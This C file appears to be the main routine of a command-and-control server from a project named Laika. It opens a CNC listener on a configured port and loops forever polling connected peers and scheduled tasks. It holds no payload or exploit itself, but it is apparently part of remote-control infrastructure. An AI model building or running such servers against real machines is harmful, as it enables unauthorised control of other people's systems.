#include <stdio.h>

#include "ltask.h"
#include "cnc.h"

struct sLaika_taskService tService;

int main(int argv, char **argc) {
    struct sLaika_cnc *cnc = laikaC_newCNC(atoi(LAIKA_CNC_PORT));

    laikaT_initTaskService(&tService);

    while (true) {
        laikaC_pollPeers(cnc, laikaT_timeTillTask(&tService));
        laikaT_pollTasks(&tService);
    }

    laikaT_cleanTaskService(&tService);
    laikaC_freeCNC(cnc);
    LAIKA_DEBUG("cnc killed\n");
    return 0;
}